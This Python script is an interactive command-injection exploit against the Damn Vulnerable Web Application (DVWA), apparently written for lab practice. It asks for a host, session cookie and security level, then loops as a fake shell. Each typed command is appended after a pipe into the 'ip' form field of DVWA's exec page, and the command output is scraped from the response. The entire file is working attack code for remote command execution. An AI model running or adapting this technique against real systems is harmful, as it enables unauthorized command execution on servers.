import requests
import time
from bs4 import BeautifulSoup
from colorama import Fore, Style
import os
import time
import subprocess

def send_request():
    
    ascii_art = """
     _______      ____          __     
    |  __ \ \    / /\ \        / /\    
    | |  | \ \  / /  \ \  /\  / /  \   
    | |  | |\ \/ /    \ \/  \/ / /\ \  
    | |__| | \  /      \  /\  / ____ \ 
    |_____/   \/        \/  \/_/    \_\
    """

    ascii_art2 = """
     _____                                          _   _____       _           _   _             
     / ____|                                        | | |_   _|     (_)         | | (_)            
    | |     ___  _ __ ___  _ __ ___   __ _ _ __   __| |   | |  _ __  _  ___  ___| |_ _  ___  _ __  
    | |    / _ \| '_ ` _ \| '_ ` _ \ / _` | '_ \ / _` |   | | | '_ \| |/ _ \/ __| __| |/ _ \| '_ \ 
    | |___| (_) | | | | | | | | | | | (_| | | | | (_| |  _| |_| | | | |  __/ (__| |_| | (_) | | | |
     \_____\___/|_| |_| |_|_| |_| |_|\__,_|_| |_|\__,_| |_____|_| |_| |\___|\___|\__|_|\___/|_| |_|
                                                                   _/ |                            
                                                                  |__/                             
    """
    
    os.system('clear')  # Clear the terminal
    print(Fore.YELLOW + f"{ascii_art}\n" + Style.RESET_ALL)
    print(Fore.RED + f"{ascii_art2}\n" + Style.RESET_ALL)
    print(Fore.RED + f"Security Level: LOW - MEDIUM - HIGH\n" + Style.RESET_ALL)
    

    host = input("Please enter the host: ").strip()  # Remove any leading/trailing whitespace
    url = f"http://{host}/DVWA/vulnerabilities/exec/"
    phpSESSID = input("Please enter the PHPSESSID: ")
    security_level = input("Please enter the security level: ")

    headers = {
        "Host": f"{host}",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br",
        "Referer": f"http://{host}/DVWA/vulnerabilities/exec/",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": f"http://{host}",
        "Connection": "close",
        "Cookie": f"security={security_level}; PHPSESSID={phpSESSID}",
        "Upgrade-Insecure-Requests": "1"
    }

    term(url, headers, host)
    
    
def term(url, headers ,host):
    
    response = subprocess.run(["ping", "-c", "1", host], stdout=subprocess.DEVNULL)

    if response.returncode == 0:
        host = url.split("//")[-1].split("/")[0]  # Extract the host from the URL
        commandInto = input(f"{Fore.GREEN}{host}{Style.RESET_ALL}@DVWA:~$ ").strip()  # Remove any leading/trailing whitespace
        
        if commandInto == "clear":
            os.system('clear')  # Clear the terminal
        else:
            data = {
            "ip": f"{host} |{commandInto}",
            "Submit": "Submit"
            }
            
            response = requests.post(url, headers=headers, data=data)
            soup = BeautifulSoup(response.text, 'html.parser')
            pre_content = soup.find('pre').text  # Encuentra el primer elemento <pre> y obtén su contenido de texto
            print(Fore.RED + "\n" + pre_content)
        
        term(url, headers, host)
    
    else:
        print(Fore.YELLOW + f'{host} is down!')
        time.sleep(5)
        os.system('clear')  # Clear the terminal
        send_request()
    
def main():
    send_request()

if __name__ == "__main__":
    main()